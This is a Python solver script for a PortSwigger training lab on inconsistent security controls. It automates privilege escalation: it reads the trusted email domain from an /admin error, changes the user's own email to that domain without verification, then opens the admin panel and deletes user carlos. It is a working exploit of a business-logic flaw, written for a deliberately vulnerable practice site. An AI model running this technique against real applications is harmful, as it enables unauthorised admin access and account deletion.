# Lab 03 — Inconsistent security controls
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
#
# Vulnerability: /admin is restricted by email DOMAIN, but the app lets you
#                freely change your own email to any domain with zero
#                verification
# Aim:           Access the admin panel and delete carlos
#
# Technique:
#   1. Register/log in as a normal user
#   2. Request /admin — read the error message revealing the required domain
#   3. Change your own email to anything@{required-domain}
#   4. Access /admin — now granted
#
# Usage: python business_logic_lab03.py <url>

import sys
import re
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   get_csrf_from_response, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 03 — INCONSISTENT SECURITY CONTROLS (EMAIL DOMAIN TRUST)")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: probe /admin to discover the required domain ────────────────
    print("\n  ── Step 1: probe /admin to discover the required email domain\n")
    r_admin = session.get(f"{url}/admin")
    print(f"  ℹ  Status: {r_admin.status_code}")

    domain_match = re.search(r'@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r_admin.text)
    if not domain_match:
        print("  ✘  Could not auto-detect required domain from /admin response")
        print_box("Response snippet", r_admin.text[:500])
        sys.exit(1)

    required_domain = domain_match.group(1)
    print(f"  ✔  Required domain discovered: @{required_domain}\n")

    # ── Step 2: change our own email to that domain ─────────────────────────
    print(f"  ── Step 2: change our email to attacker@{required_domain}\n")
    account_page = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)

    new_email = f"attacker@{required_domain}"
    data = {"email": new_email}
    if csrf:
        data["csrf"] = csrf

    r_change = session.post(f"{url}/my-account/change-email", data=data, allow_redirects=True)
    check_status(r_change, 200, f"Change email to {new_email}")

    # ── Step 3: access /admin ────────────────────────────────────────────────
    print(f"\n  ── Step 3: re-check /admin access\n")
    r_admin2 = session.get(f"{url}/admin")
    check_status(r_admin2, 200, "GET /admin after email change")

    if "carlos" not in r_admin2.text:
        print("  ?  'carlos' not visible on admin panel — inspect manually")
        sys.exit(0)

    # ── Step 4: delete carlos ────────────────────────────────────────────────
    print("\n  ── Step 4: delete carlos\n")
    r_delete = session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  The domain-based trust check and the self-service email")
    print("     change feature live in the SAME application with no")
    print("     verification link connecting them — any user can satisfy")
    print("     the domain check simply by setting their own email.")
